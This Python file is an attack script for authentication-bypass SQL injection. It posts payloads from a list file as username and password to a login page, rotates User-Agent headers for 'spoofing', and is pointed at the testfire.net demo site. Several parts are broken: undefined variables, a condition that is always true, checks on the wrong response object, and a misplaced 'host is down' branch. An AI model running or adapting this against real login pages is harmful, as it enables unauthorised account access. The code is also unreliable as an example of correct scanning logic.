import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
import sqlite3
parent_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(parent_dir)


from headers import *
import logging

attack_type = "authentication bypass SQL injection"

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads
              """

"""Reference for the header inspiration:
https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url """

"""This is When we want to attack with decoy and use spoofing """

"""Tested against: http://testfire.net/login.jsp """




pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

###############################################


#
logging.basicConfig(filename="SQLJ.log", level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')



# Create a logger (optional, you can skip this if you only use basicConfig)
logger = logging.getLogger('my_logger')


async def auth_SQL_inj_HEADER(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        """This is the main block of our exploit program which sending the payloads. """
        global pattern,htmlpattern  
        done = False 
        filename = "auth_bypass.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) #* 
            logger.info(sorted_payload)
            requests.packages.urllib3.disable_warnings()  
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                logger.info(f"The website:{urls}")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"): 

                        params = { 
                            "username": line,
                            "password": line
                        }

                        await Prepare_the_headers()
                        for headerR in headers:
                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header})
                            logger.info(f"Testing payload:{line} including headers:{headerR}") 
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info(f"Could find parameter Error,keyword:{line}")                               
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logger.info(f"Could find Error parameter, keyword:{line}")
                                await asyncio.sleep(3) 
                            
                            if htmlVULN:
                                logger.info(f"Could find Error parameter, keyword:{line}")
                                await asyncio.sleep(3)
                            
                            word = "id" in req.text                             
                            errword = "error" in req.text
                            if word:
                                logger.info(f"Could find parameter id, keyword:{line}")
                                await asyncio.sleep(3)
                            
                            if errword:
                                logger.info(f"Could find parameter error, keyword:{line}")
                                await asyncio.sleep(3)
                                
                            
                                
                        if req.status_code == 302:                                             
                            logger.info(f"Could inject parameter,keyword:{line},target:{urls}")
                            done = True
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            logger.info(f"Could find parameter admin,keyword:{line},target:{urls}")
                            
                else:
                    print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
                    logging.error(f"Could not connect to the target:{urls} in the time:{datetime.now()}")
            

    except Exception as e:
        logger.error(f"Error: {e}")        
    except KeyboardInterrupt:
        pass

    except SystemExit as e:
        raise e
        
    except ConnectionAbortedError as e:
        logger.error(f"Error: {e}")        
        
        
    finally:
        pass     

async def auth_main(urL):
    await auth_SQL_inj(urL)

print(asyncio.run(auth_SQL_inj_HEADER("http://testfire.net/login.jsp")))
# print(capturesAUTHBYPASS)